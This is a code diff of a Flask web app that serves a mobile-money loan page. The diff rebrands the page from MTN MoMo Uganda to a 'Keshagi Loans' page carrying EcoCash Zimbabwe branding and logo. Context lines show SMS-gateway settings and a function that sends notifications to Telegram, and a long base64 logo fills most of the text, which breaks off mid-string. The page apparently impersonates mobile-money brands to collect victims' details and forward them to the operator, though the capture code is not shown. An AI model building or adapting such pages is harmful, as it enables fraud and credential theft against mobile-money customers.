@@ -7,12 +7,11 @@ from flask import Flask, Response, request, jsonify
 from datetime import datetime
 import pytz
 
-app = Flask(__name__)
-from flask import send_from_directory
-
-@app.route('/assets/<path:filename>')
-def serve_assets(filename):
-    return send_from_directory('assets', filename)
+app = Flask(
+    __name__,
+    static_folder=os.path.join(os.path.dirname(__file__), "assets"),
+    static_url_path="/assets",
+)
 
 
 # Africa's Talking & SMS Configuration
@@ -72,7 +71,7 @@ def send_telegram_notification(message):
         print(f"Telegram notification orchestration failed: {e}")
 
 
-# Helper to get current time in Uganda/Johannesburg timezone
+# Helper to get current time in Zimbabwe/Johannesburg timezone
 def get_now_str():
     try:
         tz = pytz.timezone('Africa/Kampala')
@@ -114,7 +113,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MTN MoMo Loans — Uganda Mobile Money</title>
+  <title>Keshagi Loans — EcoCash Zimbabwe</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
     :root {
@@ -179,10 +178,10 @@ HTML_PAGE = r"""<!DOCTYPE html>
     <div class="max-w-[760px] mx-auto px-4 h-16 flex items-center justify-between">
       <div class="flex items-center gap-3 cursor-pointer" onclick="goTo('home')">
         <div class="flex items-center gap-2">
-          <img src="data:image/png;base64,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" alt="MTN MoMo Logo" class="h-10 w-auto object-contain">
+<img src="/assets/logo.jpg" alt="EcoCash SuperApp" class="w-10 h-10 mx-auto rounded-2xl object-cover shadow-md">
           <div class="flex flex-col">
-            <span class="text-lg font-black text-[#FFCC00] leading-none" style="color: #FFCC00; -webkit-text-stroke: 0.5px #004F71;">MoMo</span>
-            <span class="text-[10px] font-bold text-[#004F71] leading-none mt-0.5">from MTN</span>
+            <span class="text-lg font-black text-[#004F71] leading-none">Keshagi</span>
+            <span class="text-[10px] font-bold text-[#004F71] leading-none mt-0.5">Zimbabwe Loans</span>
           </div>
         </div>
         <span class="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-semibold bg-yellow-50 text-yellow-700 border border-yellow-200">
@@ -192,7 +191,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       </div>
 
       <button id="menu-btn" onclick="toggleMenu(true)" class="p-2 text-slate-700 hover:bg-slate-100 ">
-        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/></svg>
+      <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/></svg>
       </button>
     </div>
   </header>
@@ -203,7 +202,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
     <div id="drawer-panel" class="absolute right-0 top-0 bottom-0 w-[300px] bg-white shadow-2xl p-6 flex flex-col justify-between transform translate-x-full transition-transform duration-300">
       <div>
         <div class="flex items-center justify-between pb-4 border-b border-slate-200"><img src="data:image/png;base64,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